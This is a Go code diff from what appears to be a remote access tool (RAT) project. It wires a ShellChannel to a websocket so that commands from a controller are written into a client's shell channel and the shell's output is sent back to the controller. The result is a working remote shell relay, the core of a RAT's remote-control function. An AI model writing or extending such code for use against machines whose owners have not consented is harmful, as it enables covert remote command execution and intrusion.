@@ -5,15 +5,19 @@ import (
 	"fmt"
 	"io"
 	"rat/shared/network/header"
+
+	"golang.org/x/net/websocket"
 )
 
-type ShellChannel struct{}
+type ShellChannel struct {
+	ws *websocket.Conn
+}
 
 func (ShellChannel) Header() header.PacketHeader {
 	return header.ShellChannelHeader
 }
 
-func (ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
+func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
 	/* 	if ws, ok := c.Listeners[header.ShellHeader]; ok {
 		return sendMessage(ws, c, ShellCommandMessage{packet.Command})
 	} */
@@ -30,7 +34,11 @@ func (ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
 			if m == nil {
 				break
 			}
-			fmt.Println("recv", m)
+
+			if msg, ok := m.(*ShellMessage); ok {
+				fmt.Println("control > command", msg.Command, []byte(msg.Command))
+				channel.Write([]byte(msg.Command))
+			}
 		}
 	}()
 
@@ -38,13 +46,12 @@ func (ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
 	b := make([]byte, 1024)
 	for {
 		n, err := r.Read(b)
-		fmt.Println("channel in", n, err, string(b[:n]))
+		fmt.Println("client > command", err, string(b[:n]), b[:n])
 		if err != nil {
 			break
 		}
 
-		// not implemented, send data to ws
-		//sendMessage(ws, c, ShellCommandMessage{packet.Command})
+		sendMessage(data.ws, c, ShellCommandMessage{string(b[:n])})
 	}
 
 	return nil
